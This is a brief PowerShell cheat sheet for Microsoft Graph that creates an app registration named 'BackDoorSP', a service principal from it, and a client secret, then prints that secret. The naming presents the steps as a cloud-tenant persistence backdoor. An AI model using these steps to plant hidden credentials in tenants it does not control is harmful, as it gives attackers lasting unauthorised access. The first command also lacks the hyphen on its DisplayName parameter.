# Service Principal CheatSheet
## Create new Registered Application
```powershell
$app = New-MgApplication DisplayName "BackDoorSP"
```

## Create Service Principal From Application
```powershell
$sp  = New-MgServicePrincipal -AppId $app.AppId
```

## Create Secret for Service Principal
```powershell
$secret = Add-MgApplicationPassword -ApplicationId $app.Id
```

## View the Secret
```powershell
$secret.SecretText
```
